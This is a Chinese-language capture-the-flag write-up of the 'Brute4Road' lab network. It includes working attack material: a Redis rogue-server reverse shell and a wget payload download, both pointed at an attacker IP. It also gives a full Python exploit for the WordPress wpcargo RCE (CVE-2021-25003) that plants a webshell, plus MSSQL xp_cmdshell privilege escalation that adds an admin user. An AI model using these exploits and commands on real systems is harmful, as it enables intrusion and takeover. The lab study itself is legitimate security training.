## 文章

https://fushuling.com/index.php/2023/09/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7brute4road/

https://exp10it.cn/2023/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/

https://zysgmzb.club/index.php/archives/241

## 打靶过程

先用fscan扫描

![image-20231010230806109](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010230806109.png)

存在Redis未授权，使用MDUT连接，计划任务和ssh写公钥都不行

查看Redis版本为5.0.12，可能存在主从复制漏洞

![image-20231010231149998](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010231149998.png)

恶意Redis服务器工具 https://github.com/n0b0dyCN/redis-rogue-server



```bash
# 开启恶意Redis服务
python3 redis-rogue-server.py --rhost=39.99.159.233 --lhost=182.92.161.222 --lport=9999
# 选择反弹shell
r
# 反弹的IP和端口
182.92.161.222 7777
# nc监听
nc -lvp 7777
```

![image-20231010233501404](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010233501404.png)

之后再弹一个完整的shell

```bash
script -qc /bin/bash /dev/null
```

![image-20231010233514930](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231010233514930.png)

再通过wget来下载msf马

```bash
wget http://182.92.161.222/test
```

执行test来获取session

之后便是base64提权

![image-20231011000417086](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011000417086.png)

传入fscan

![image-20231011000636205](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011000636205.png)

看下网卡

![image-20231011001130409](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011001130409.png)

fscan扫

```bash
./fscan -h 172.22.2.7/24
```

```
    (icmp) Target 172.22.2.3      is alive
    (icmp) Target 172.22.2.7      is alive
    (icmp) Target 172.22.2.16     is alive
    (icmp) Target 172.22.2.18     is alive
    (icmp) Target 172.22.2.34     is alive
    [*] Icmp alive hosts len is: 5
    172.22.2.16:445 open
    172.22.2.3:445 open
    172.22.2.34:139 open
    172.22.2.16:139 open
    172.22.2.18:139 open
    172.22.2.34:135 open
    172.22.2.3:139 open
    172.22.2.16:135 open
    172.22.2.3:135 open
    172.22.2.16:80 open
    172.22.2.18:80 open
    172.22.2.7:80 open
    172.22.2.18:22 open
    172.22.2.7:21 open
    172.22.2.16:1433 open
    172.22.2.34:445 open
    172.22.2.18:445 open
    172.22.2.7:22 open
    172.22.2.7:6379 open
    172.22.2.3:88 open
    [*] alive ports len is: 20
    start vulscan
    [*] WebTitle: http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
    [*] NetInfo:
    [*]172.22.2.34
       [->]CLIENT01
       [->]172.22.2.34
    [*] NetInfo:
    [*]172.22.2.3
       [->]DC
       [->]172.22.2.3
    [*] NetBios: 172.22.2.34     XIAORANG\CLIENT01              
    [*] NetInfo:
    [*]172.22.2.16
       [->]MSSQLSERVER
       [->]172.22.2.16
    [*] 172.22.2.3  (Windows Server 2016 Datacenter 14393)
    [*] 172.22.2.16  (Windows Server 2016 Datacenter 14393)
    [*] WebTitle: http://172.22.2.16        code:404 len:315    title:Not Found
    [*] NetBios: 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393 
    [*] NetBios: 172.22.2.3      [+]DC DC.xiaorang.lab               Windows Server 2016 Datacenter 14393 
    [*] NetBios: 172.22.2.18     WORKGROUP\UBUNTU-WEB02         
    [+] ftp://172.22.2.7:21:anonymous 
       [->]pub
    [*] WebTitle: http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点
```

有一个wordpress网站

通过wpscan去扫一下

```bash
wpscan --url http://172.22.2.18  -e ap
```

发现存在wpcargo插件，有CVE-2021-25003-WordPress Unauthenticated RCE

![image-20231011081723815](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011081723815.png)

使用现成脚本打

```python
import sys
import binascii
import requests

# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://127.0.0.1:8001/'
cmd = 'ls'

# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.
requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)

# We have uploaded a webshell - now let's use it to execute a command.
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))
```

然后再次写shell

![image-20231011082043035](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011082043035.png)

用蚁剑连接

![image-20231011082139994](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011082139994.png)

查看wordpress配置文件可以看到有数据库用户名和密码

![image-20231011082526103](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011082526103.png)

先用蚁剑检查一下支持的数据库类型

![image-20231011083929667](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011083929667.png)

使用MYSQLI进行连接，获取flag

![image-20231011083950538](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011083950538.png)

除了flag，还有一份密码表，猜测是172.22.2.16的mssql的密码，尝试爆破一下啊

获得密码

![image-20231011185913080](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011185913080.png)

用MDUT连接mssql

![image-20231011190348749](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011190348749.png)

因为MDUT连接会出现报错，所以我换了一个命令行工具来利用

https://github.com/uknowsec/SharpSQLTools

先看有没有开启3389端口

```bash
netstat -ano
```

开启了3389端口

![image-20231011195206965](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011195206965.png)

添加用户来连接rdp

```bash
.\SharpSQLTools.exe 172.22.2.16 sa ElGNkOiC master xp_cmdshell 'c:\\hack\\SweetPotato.exe -a \"net user ki1ro qwer1234! /add\"'
.\SharpSQLTools.exe 172.22.2.16 sa ElGNkOiC master xp_cmdshell 'c:\\hack\\SweetPotato.exe -a \"net localgroup administrators ki1ro /add\"'
# 查看用户是否加入
.\SharpSQLTools.exe 172.22.2.16 sa ElGNkOiC master xp_cmdshell 'c:\\hack\\SweetPotato.exe -a \"net user\"'
```

![image-20231011195839231](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011195839231.png)

获取flag

![image-20231011200017732](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231011200017732.png)